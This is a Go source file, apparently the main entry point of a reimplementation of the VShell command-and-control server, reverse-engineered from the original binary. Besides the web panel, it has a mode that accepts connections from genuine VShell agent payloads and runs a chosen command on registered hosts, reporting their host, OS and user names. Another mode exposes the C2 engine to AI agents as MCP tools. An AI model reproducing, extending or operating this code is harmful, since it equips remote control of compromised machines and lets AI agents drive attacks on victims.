// Package main is the VShell server entry point.
//
// The startup sequence below is compared with the original binary's
// decompiled control flow. Reverse-engineering references identify observed
// call sites; they do not imply that every behavior is fully reproduced.
//
// Observed startup outline:
//  1. Load conf/setting.conf; exit if the settings loader returns nil.
//  2. Select the startup banner using master_type.
//  3. Initialize the application.
//  4. Mount and start the web router.
//  5. Start background services and keep the process alive.
//
// Binary symbols and offsets are retained as research notes, not as stable
// API names. Treat conclusions as provisional where the implementation status
// or supporting tests do not establish exact equivalence.
package main

import (
	"flag"
	"fmt"
	"net/http"
	"os"
	"time"

	"vshell/c2engine"
	"vshell/controllers"
	"vshell/mcp"
	"vshell/router"
	"vshell/utils"
)

// loadConfig loads the application settings. A nil result is treated as a
// fatal startup error; the process prints the loader error and exits.
func loadConfig() *utils.FullSettings {
	cfg := utils.GetFullSettings()
	if cfg == nil {
		fmt.Println("load config file error")
		os.Exit(1)
	}
	return cfg
}

// consoleBanner prints the console logger configuration using the current
// log level. The JSON-shaped text is emitted as a startup diagnostic.
func consoleBanner(cfg *utils.FullSettings) {
	fmt.Printf("console %s\n", fmt.Sprintf(`{"level":%d,"color":true}`, cfg.LogLevel))
}

// webBanner prints the file-logger configuration used by service mode.
// The filename and log level come from the loaded settings.
func webBanner(cfg *utils.FullSettings) {
	fmt.Printf("file %s\n", fmt.Sprintf(
		`{"level":%d,"filename":"%s","daily":false,"maxlines":100000,"color":true}`,
		cfg.LogLevel, cfg.LogPath))
}

// main initializes the settings, application, HTTP router, and background
// services. This is an in-progress reimplementation, so startup behavior may
// differ from the original binary.
func main() {
	// `vshell-server mcp` 走 MCP stdio 模式：不启动 Web 面板，直接把引擎侧
	// 的能力暴露成 MCP 工具（见 mcp/ 包与 docs/DEV.md）。
	// `vshell-server official-tcp` 起一个**官方协议**的 tcp 服务端（R24）：
	// 让原版 agent 载荷能直连复刻端。用法见 docs/PROTOCOL.md §2.7。
	if len(os.Args) > 1 && os.Args[1] == "official-tcp" {
		runOfficialTCP(os.Args[2:])
		return
	}

	// `vshell-server official-agent-sim` 扮演**官方 agent**，用于在没有原版载荷的
	// 机器上验证 official-tcp 服务端（也可当演示）。
	if len(os.Args) > 1 && os.Args[1] == "official-agent-sim" {
		runOfficialAgentSim(os.Args[2:])
		return
	}

	if len(os.Args) > 1 && os.Args[1] == "mcp" {
		runMCPServer()
		return
	}

	cfg := loadConfig()

	// Keep the configured log level available to the startup path.
	_ = cfg.LogLevel

	// Service mode uses the file-logger banner; other modes use the console
	// banner. This describes the current implementation's branch behavior.
	switch cfg.MasterType {
	case "service":
		webBanner(cfg)
	default:
		consoleBanner(cfg)
	}

	// Initialize the application before starting the HTTP server.
	if err := controllers.AppStart(cfg); err != nil {
		fmt.Printf("start app: %v\n", err)
		os.Exit(1)
	}

	// Mount the web routes and serve them asynchronously so startup can
	// continue into background services. Listener errors are currently
	// discarded here; they are not reported to the caller.
	h := router.InitRouter()
	addr := fmt.Sprintf("%s:%d", cfg.WebIP, cfg.WebPort)
	go func() {
		if cfg.WebOpenSSL && cfg.WebCertFile != "" && cfg.WebKeyFile != "" {
			_ = http.ListenAndServeTLS(addr, cfg.WebCertFile, cfg.WebKeyFile, h)
		} else {
			_ = http.ListenAndServe(addr, h)
		}
	}()

	// Start background services, then block the main goroutine so the process
	// remains alive. The empty select has no shutdown path by itself.
	controllers.AppBackground()
	select {}
}

// runMCPServer 以 MCP stdio 模式运行。
//
// 与面板共享同一份配置与引擎：MCP 工具通过本机面板 API 调用（需要面板在跑），
// 因此这里只加载配置、给出启动提示，然后阻塞在 stdin 的 JSON-RPC 循环上。
func runMCPServer() {
	cfg := loadConfig()
	_ = cfg
	// 关键：把 full settings 同步到鉴权用的 settings 单例，否则 GetJWTSecret()
	// 会落到惰性默认值（空 → 随机），签出来的 token 与服务端不一致，
	// 所有工具调用都会被 401 拒绝（响应里 message 为空）。
	utils.SyncSettingsFromConfig()
	srv := mcp.NewServer(os.Stdout)
	if err := srv.Serve(os.Stdin); err != nil {
		fmt.Fprintf(os.Stderr, "mcp: %v\n", err)
		os.Exit(1)
	}
}

// runOfficialTCP 启动官方协议的 tcp 服务端（用于与原版 agent 互操作验证）。
//
// 用法：vshell-server official-tcp [-listen 127.0.0.1:18650] [-vkey VKEY] [-salt SALT] [-cmd "id"]
func runOfficialTCP(args []string) {
	flagSet := flag.NewFlagSet("official-tcp", flag.ExitOnError)
	addr := flagSet.String("listen", "127.0.0.1:18650", "监听地址")
	vkey := flagSet.String("vkey", "vkey", "监听器 Vkey（agent 会用 md5(vkey) 应答）")
	salt := flagSet.String("salt", "", "加密盐（帧密钥 = hex(md5(salt))）")
	cmd := flagSet.String("cmd", "", "客户端注册后自动执行一条命令")
	_ = flagSet.Parse(args)

	srv := c2engine.NewOfficialTCPServer(*addr, *vkey, *salt)
	srv.AuthExtras = os.Getenv("VSHELL_AUTH_EXTRAS") == "1"
	if err := srv.Start(); err != nil {
		fmt.Fprintf(os.Stderr, "official-tcp: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("official-tcp listening on %s (vkey=%s)\n", *addr, *vkey)

	if *cmd != "" {
		go func() {
			time.Sleep(3 * time.Second)
			out, err := srv.RunCommand(*cmd, 20*time.Second)
			if err != nil {
				fmt.Printf("command %q failed: %v\n", *cmd, err)
				return
			}
			fmt.Printf("command %q output: %s\n", *cmd, out)
		}()
	}
	// 打印 client 注册信息，便于互操作验证
	go func() {
		for i := 0; i < 30; i++ {
			time.Sleep(2 * time.Second)
			if info := srv.ClientInfo(); len(info) > 0 {
				fmt.Printf("client registered: host=%v os=%v user=%v\n", info["HostName"], info["OsName"], info["UserName"])
			}
		}
	}()
	select {}
}

// runOfficialAgentSim 启动官方 agent 模拟器。
func runOfficialAgentSim(args []string) {
	fs := flag.NewFlagSet("official-agent-sim", flag.ExitOnError)
	addr := fs.String("addr", "127.0.0.1:18650", "服务端地址")
	vkey := fs.String("vkey", "vkey", "Vkey（应答 md5(vkey)）")
	salt := fs.String("salt", "", "加密盐")
	host := fs.String("host", "sim-host", "上报的主机名")
	secs := fs.Int("timeout", 10, "运行秒数")
	_ = fs.Parse(args)

	sim := &c2engine.OfficialAgentSim{Addr: *addr, Vkey: *vkey, Salt: *salt, HostName: *host}
	res, err := sim.Run(time.Duration(*secs) * time.Second)
	if err != nil {
		fmt.Fprintf(os.Stderr, "official-agent-sim: %v\n", err)
	}
	fmt.Printf("sim done: registered=%v tasks=%d results=%d\n", res.Registered, res.Tasks, len(res.Results))
	for _, r := range res.Results {
		fmt.Printf("result: %s\n", r)
	}
	if !res.Registered {
		os.Exit(1)
	}
}
